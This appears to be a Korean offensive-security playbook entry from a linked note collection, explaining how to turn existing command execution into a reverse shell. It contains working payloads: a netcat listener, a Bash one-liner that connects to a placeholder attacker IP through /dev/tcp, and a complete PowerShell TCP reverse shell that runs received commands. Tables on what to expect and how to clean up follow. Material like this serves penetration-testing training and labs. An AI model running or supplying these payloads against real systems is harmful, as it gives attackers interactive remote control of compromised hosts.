---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["대상에서 명령 실행 확보"]
필요권한: ["대상에서 명령 실행 권한"]
필요조건: ["공격자 방향 outbound 허용"]
결과: ["세션", "명령 실행"]
---

# Reverse Shell 획득

## 한 줄 판단

대상에서 이미 명령을 실행할 수 있고 대상이 공격 호스트의 수신 주소와 TCP 포트로 연결할 수 있다면, 역방향 연결을 실행해 현재 명령 실행 계정의 대화형 셸을 받는다.

## 사용할 때

- Web Shell, RCE, 업로드 payload, WMI/WinRM 명령 실행이 가능할 때.
- 공격 호스트에서 대상의 새 수신 포트로는 연결할 수 없지만 대상에서 공격 호스트로 나가는 TCP 연결은 허용될 때.
- 일반 명령 실행을 지속적인 대화형 세션으로 바꾸고 싶을 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 명령 실행 | Web Shell/RCE/원격 exec | `id`/`whoami` 출력 |
| 역방향 네트워크 경로 | 공격 호스트에서 수신 포트를 연 뒤 대상에서 연결 시험 | 대상에서 공격 호스트의 IP와 포트까지 TCP 연결 가능 |
| payload 선택 | OS/shell/언어 | bash, sh, powershell, php 등 |

## 실행

1. 공격자 listener를 먼저 연다.
2. 대상 OS와 사용 가능한 interpreter에 맞는 payload를 고른다.
3. 명령을 실행하고 연결이 들어오는지 확인한다.
4. Linux면 [[TTY 업그레이드]], Windows면 PowerShell/파일 전송 흐름으로 안정화한다.

### Linux 공격 호스트에서 listener 시작

`ss`로 선택한 포트의 기존 listener를 확인한 뒤 전용 터미널에서 Netcat을 실행한다. 연결이 들어온 뒤 두 번째 공격 호스트 터미널에서 같은 `ss` 명령으로 실제 `<LISTENER_PID>`를 기록한다.

```bash
ss -ltnp 'sport = :<PORT>'
nc -lvnp <PORT>
```

두 번째 공격 호스트 터미널:

```bash
ss -ltnp 'sport = :<PORT>'
```

확인할 출력:

- 대상에서 연결이 들어오면 shell prompt 또는 명령 출력.

### Linux 대상 호스트에서 Bash reverse shell 실행

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1'
```

확인할 출력:

- listener에 Linux shell 연결.
- 연결 직후 `echo $$`와 `ps -p $$ -o pid,lstart,args`로 `<REMOTE_SHELL_PID>`, 시작 시각과 command line을 기록한다.

### Windows 대상 호스트에서 PowerShell reverse shell 실행

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>', <PORT>)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
while (($count = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = ([Text.Encoding]::ASCII).GetString($bytes, 0, $count)
    $output = (Invoke-Expression $command 2>&1 | Out-String)
    $prompt = $output + 'PS ' + (Get-Location).Path + '> '
    $response = [Text.Encoding]::ASCII.GetBytes($prompt)
    $stream.Write($response, 0, $response.Length)
    $stream.Flush()
}
$client.Close()
```

확인할 출력:

- listener에 PowerShell 세션이 연결되고 `whoami`, `hostname` 결과가 반환된다.
- 연결 직후 `Get-Process -Id $PID | Select-Object Id,StartTime,Path`로 `<REMOTE_SHELL_PID>`, 시작 시각과 executable 경로를 기록한다.

파일형 payload가 필요한 Windows 환경에서는 placeholder 명령을 만들지 않고 [[MSFVenom Payload 생성과 Handler 수신]]에서 OS·architecture·payload와 handler를 함께 맞춘다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| listener에 연결이 들어온다. | 대상에서 공격 호스트로 역방향 연결이 생성됨 | 기존 명령 실행 계정의 제한된 셸 세션 | `whoami`, `id`, `hostname`으로 실행 계정과 호스트 확인 |
| Linux에서 `id`, `hostname`이 실행됨 | Linux 명령 실행 컨텍스트 확인 | Linux 셸 세션 | [[TTY 업그레이드]] 후 [[Linux 셸 확보 후 초기 열거와 권한 상승]] |
| Windows에서 `whoami`, `hostname`이 실행됨 | Windows 명령 실행 컨텍스트 확인 | Windows 셸 세션 | [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]] |
| Meterpreter handler에 session이 열림 | 파일형 payload와 handler 연결 확인 | Meterpreter 세션 | [[Meterpreter 세션 후속 행동]] 후 플랫폼별 셸 상태 라우터 |
| 연결 없음 | outbound 차단, IP/포트 오류 | 시작 상태 유지 | tun0/VPN IP, 다른 포트, ping/curl 테스트 |
| 즉시 종료 | shell/interpreter 문제 | 시작 상태 유지 | `/bin/sh`, python, powershell 인코딩 대체 |
| 명령은 되나 shell 불안정 | TTY 없음 | 시작 상태 유지 | [[TTY 업그레이드]], SSH 전환 |

## 확인할 출력과 권한

- 판정 기준: listener 연결만으로 끝내지 않고 `whoami`·`id`·`hostname`으로 대상 호스트와 실행 계정을 확인한다.

## 변경 영향과 복구

정상 연결이 살아 있을 때는 원격 셸에서 시작한 하위 작업과 파일을 먼저 정리하고 `exit`로 셸을 끝낸다. 공격 호스트 listener가 종료되지 않았다면 전용 터미널에서 `Ctrl+C`로 끝내고, 기록한 PID와 포트를 확인한다.

| 변경 대상 | 기존 상태·식별값 | 종료·정리 | 완료 확인 |
|---|---|---|---|
| 대상 reverse shell process | 연결 뒤 기록한 `<REMOTE_SHELL_PID>`·시작 시각·command line 또는 path | 연결이 살아 있으면 원격 셸의 `exit`; 이미 끊겼지만 원래 명령 실행 경로가 남아 있으면 PID·시작 시각·command line을 대조한 뒤에만 `kill <REMOTE_SHELL_PID>` 또는 `Stop-Process -Id <REMOTE_SHELL_PID>` | 기록한 PID가 없거나, PID가 재사용됐으면 시작 시각·command line이 달라 별도 process임을 확인 |
| 공격 호스트 listener | 실행 전 포트 상태와 `<LISTENER_PID>` | 원격 정리 뒤 전용 터미널의 `Ctrl+C`; 터미널을 잃었으면 command line을 다시 대조한 뒤 `kill <LISTENER_PID>` | `ps -p <LISTENER_PID>`에 process가 없고 `ss -ltnp 'sport = :<PORT>'`에 이번 PID가 없음 |
| 전달한 script·payload·임시 파일 | 실행 전 존재하지 않은 exact 경로와 hash | 생성한 기법 문서의 복구 절차로 exact 경로만 제거 | 해당 경로가 없고 기존 파일은 유지됨 |

연결이 끊긴 뒤 process를 확인할 때는 원래 명령 실행 경로에서 다음처럼 조회한다.

```bash
ps -p <REMOTE_SHELL_PID> -o pid,lstart,args
```

```powershell
Get-CimInstance Win32_Process -Filter "ProcessId=<REMOTE_SHELL_PID>" |
    Select-Object ProcessId,CreationDate,ExecutablePath,CommandLine
```

Web Shell, cron, DB 설정 등 별도 실행 경로를 통해 시작했다면 연결을 끊기 전에 해당 기법의 원격 복구를 먼저 수행한다. 이미 연결이 끊겼고 원래 실행 경로도 없으면 원격 process·파일 정리를 확인할 수 없으므로 완료로 기록하지 않는다. 이름만으로 모든 shell·PowerShell·Netcat process를 종료하지 않는다.

## 후속 공격 연결

- [[TTY 업그레이드]]
- [[MSFVenom Payload 생성과 Handler 수신]]
- [[Meterpreter 세션 후속 행동]]
- [[상황별 파일 전송]]
- [[Linux 권한 상승 열거]]
- [[Windows 권한 상승 열거]]

## 관련 상태 라우터

- Linux 셸: [[Linux 셸 확보 후 초기 열거와 권한 상승]]
- Windows 셸: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- root·로컬 관리자·SYSTEM 확인: [[고권한 세션 확보 후 후속 판단]]

## 관련 도구

- [[netcat]]
- [[powershell]]
- [[msfvenom]]
